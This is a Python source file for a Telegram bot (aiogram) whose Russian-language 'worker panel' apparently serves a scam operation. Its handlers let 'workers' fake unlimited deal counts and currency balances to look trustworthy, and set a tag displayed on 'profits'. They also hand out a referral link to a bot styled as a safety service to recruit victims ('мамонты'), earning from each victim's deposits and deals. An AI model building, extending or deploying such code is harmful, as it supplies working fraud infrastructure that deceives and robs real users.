from aiogram import Router, F
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from database import get_user, add_deals, remove_deals, add_balance, set_tag
from keyboards import worker_panel_kb, tag_kb, cancel_kb
from states import WorkerStates

router = Router()

E = {
    "gear": '<tg-emoji emoji-id="5368585173612956104">🛠</tg-emoji>',
    "chart": '<tg-emoji emoji-id="5368585173612956104">📊</tg-emoji>',
    "money": '<tg-emoji emoji-id="5375296873982604963">💰</tg-emoji>',
    "tag": '<tg-emoji emoji-id="5368585173612956104">🏷</tg-emoji>',
    "people": '<tg-emoji emoji-id="5368585173612956104">👥</tg-emoji>',
    "check": '<tg-emoji emoji-id="5368324170671202286">✅</tg-emoji>',
    "cross": '<tg-emoji emoji-id="5368324170671202286">❌</tg-emoji>',
    "star": '<tg-emoji emoji-id="5368324170671202286">⭐</tg-emoji>',
}


@router.message(F.text == "🛠 Воркер панель")
async def show_panel(message: Message):
    user = await get_user(message.from_user.id)
    if user["role"] not in ["owner", "admin", "worker"]:
        await message.answer(f"{E['cross']} У вас нет доступа.")
        return
    text = (
        f"{E['gear']} <b>ВОРКЕР ПАНЕЛЬ</b>\n\n"
        "<b>Доступные действия:</b>\n"
        f"• {E['chart']} Просмотр статистики\n"
        "• 📦 Управление своими сделками\n"
        "• 📉 Накрутка сделок (без лимита)\n"
        f"• {E['money']} Накрутка баланса (без лимита)\n"
        f"• {E['tag']} Управление тегом для профитов\n"
        f"• {E['people']} Управление своими мамонтами\n\n"
        "Выберите действие:"
    )
    await message.answer(text, reply_markup=worker_panel_kb(), parse_mode="HTML")


@router.message(F.text == "📊 Моя статистика")
async def worker_stats(message: Message):
    u = await get_user(message.from_user.id)
    if u["role"] not in ["owner", "admin", "worker"]:
        return
    text = (
        f"{E['chart']} <b>ВАША СТАТИСТИКА</b>\n"
        f"👤 Воркер: @{message.from_user.username or 'Нет'}\n\n"
        f"🆔 ID: {message.from_user.id}\n"
        f"{E['check']} Верификация: {'✅ Да' if u['role'] in ['admin', 'owner'] else '❌ Нет'}\n\n"
        "📅 В системе с: 05.10.2026\n"
        "🕒 Последняя активность: 05.10.2026 09:05\n\n"
        f"{E['chart']} <b>Общая статистика:</b>\n"
        f"• Успешных сделок: {u['deals']}\n"
        f"• Рейтинг: 5.0 {E['star']}\n"
        "• Споров выиграно: 0\n\n"
        f"{E['people']} <b>Мои мамонты:</b>\n"
        "• Всего мамонтов: 0\n"
        "• Сделок мамонтов: 0\n\n"
        f"{E['money']} <b>Баланс:</b>\n"
        f"• 🇷🇺 Rub: {u['rub']}\n"
        f"• 🇺🇸 Usd: {u['usd']}\n"
        f"• 💎 Gram: {u['gram']}\n"
        f"• 💲 Usdt: {u['usdt']}\n"
        f"• {E['star']} Stars: {u['stars']}"
    )
    await message.answer(text, reply_markup=worker_panel_kb(), parse_mode="HTML")


@router.message(F.text == "📉 Накрутка сделок")
async def fake_deals_start(message: Message, state: FSMContext):
    u = await get_user(message.from_user.id)
    if u["role"] not in ["owner", "admin", "worker"]:
        return
    await message.answer(
        "📉 <b>НАКРУТКА СДЕЛОК (ВОРКЕР)</b>\n\n"
        "Введите количество сделок:\n• Без лимита\n• Только для себя\n\n"
        "Формат:\n5\n\nВведите количество:",
        reply_markup=cancel_kb(), parse_mode="HTML"
    )
    await state.set_state(WorkerStates.waiting_for_deals_count)


@router.message(WorkerStates.waiting_for_deals_count)
async def process_fake_deals(message: Message, state: FSMContext):
    try:
        count = int(message.text)
        await add_deals(message.from_user.id, count)
        await message.answer(f"{E['check']} Накручено {count} сделок!",
                             reply_markup=worker_panel_kb())
    except ValueError:
        await message.answer(f"{E['cross']} Введите целое число.")
    await state.clear()


@router.message(F.text == "💰 Накрутка баланса")
async def fake_balance_start(message: Message, state: FSMContext):
    u = await get_user(message.from_user.id)
    if u["role"] not in ["owner", "admin", "worker"]:
        return
    await message.answer(
        f"{E['money']} <b>НАКРУТКА БАЛАНСА (ВОРКЕР)</b>\n\n"
        "Введите сумму и валюту:\n• Без лимита\n• Доступно: Gram, Rub, Usd, Usdt, Stars\n"
        "• Только для себя\n\nФормат:\n1000 Rub\n100 Stars\n50 Gram\n\nВведите:",
        reply_markup=cancel_kb(), parse_mode="HTML"
    )
    await state.set_state(WorkerStates.waiting_for_balance_input)


@router.message(WorkerStates.waiting_for_balance_input)
async def process_fake_balance(message: Message, state: FSMContext):
    try:
        parts = message.text.split()
        if len(parts) != 2:
            raise ValueError
        amount = float(parts[0])
        currency = parts[1].lower()
        cur_map = {"rub": "rub", "usd": "usd", "gram": "gram", "usdt": "usdt", "stars": "stars"}
        if currency not in cur_map:
            await message.answer(f"{E['cross']} Доступно: Rub, Usd, Gram, Usdt, Stars")
            return
        await add_balance(message.from_user.id, cur_map[currency], amount)
        await message.answer(f"{E['check']} Баланс пополнен на {amount} {currency.capitalize()}!",
                             reply_markup=worker_panel_kb())
    except ValueError:
        await message.answer(f"{E['cross']} Формат: 1000 Rub")
    await state.clear()


@router.message(F.text == "📈 Открутка сделок")
async def unfake_deals_start(message: Message, state: FSMContext):
    u = await get_user(message.from_user.id)
    if u["role"] not in ["owner", "admin", "worker"]:
        return
    await message.answer(
        "📈 <b>ОТКРУТКА СДЕЛОК</b>\n\n"
        "Введите количество для списания:\n\n"
        "Формат:\nДля себя: 5\nДля другого: 123456789 10\n\nВведите:",
        reply_markup=cancel_kb(), parse_mode="HTML"
    )
    await state.set_state(WorkerStates.waiting_for_unfake_deals)


@router.message(WorkerStates.waiting_for_unfake_deals)
async def process_unfake(message: Message, state: FSMContext):
    try:
        parts = message.text.split()
        if len(parts) == 1:
            await remove_deals(message.from_user.id, int(parts[0]))
            await message.answer(f"{E['check']} Списано {parts[0]} сделок.",
                                 reply_markup=worker_panel_kb())
        elif len(parts) == 2:
            await remove_deals(int(parts[0]), int(parts[1]))
            await message.answer(f"{E['check']} Списано у пользователя {parts[0]}.",
                                 reply_markup=worker_panel_kb())
        else:
            raise ValueError
    except ValueError:
        await message.answer(f"{E['cross']} Формат: 5 или 123456789 10")
    await state.clear()


@router.message(F.text == "🏷 Мой тег")
async def manage_tag(message: Message):
    u = await get_user(message.from_user.id)
    if u["role"] not in ["owner", "admin", "worker"]:
        return
    text = (
        f"{E['tag']} <b>УПРАВЛЕНИЕ ТЕГОМ</b>\n\n"
        f"Текущий тег: {u['tag']}\n\n"
        "Установите тег, который будет отображаться в профитах.\n"
        "Если тег не установлен, будет сгенерировано автоматическое имя (воркер2035, воркер2914 и т.д.)\n\n"
        "Выберите действие:"
    )
    await message.answer(text, reply_markup=tag_kb(), parse_mode="HTML")


@router.callback_query(F.data == "set_tag_start")
async def set_tag_start(cb: CallbackQuery, state: FSMContext):
    await cb.message.edit_text("Введите новый тег:", reply_markup=cancel_kb())
    await state.set_state(WorkerStates.waiting_for_tag_input)
    await cb.answer()


@router.message(WorkerStates.waiting_for_tag_input)
async def save_tag_handler(message: Message, state: FSMContext):
    await set_tag(message.from_user.id, message.text)
    await message.answer(f"{E['check']} Тег установлен: {message.text}",
                         reply_markup=worker_panel_kb())
    await state.clear()


@router.callback_query(F.data == "delete_tag")
async def delete_tag_cb(cb: CallbackQuery):
    await set_tag(cb.from_user.id, "Не установлен")
    await cb.message.edit_text(f"{E['cross']} Тег удалён.", reply_markup=None)
    await cb.answer()


@router.message(F.text == "👥 Мои мамонты")
async def my_mammoths(message: Message):
    u = await get_user(message.from_user.id)
    if u["role"] not in ["owner", "admin", "worker"]:
        return
    text = (
        f"{E['people']} <b>МОИ МАМОНТЫ</b>\n"
        "У вас пока нет приглашенных мамонтов.\n\n"
        "<b>Как приглашать мамонтов:</b>\n"
        "1. Используйте свою реферальную ссылку\n"
        "2. Когда мамонт перейдет по ссылке и зарегистрируется, он автоматически привяжется к вам\n"
        "3. Вы получаете профит от каждого пополнения баланса мамонтом\n"
        "4. Вы получаете профит от каждой сделки мамонта\n\n"
        f"<b>Ваша реферальная ссылка:</b>\nhttps://t.me/Lolz_safety_bot?start={message.from_user.id}"
    )
    await message.answer(text, reply_markup=worker_panel_kb(), parse_mode="HTML")


@router.message(F.text == "✂️ Урезать профиль")
async def cut_profile(message: Message):
    await message.answer("✂️ Функция в разработке.", reply_markup=worker_panel_kb())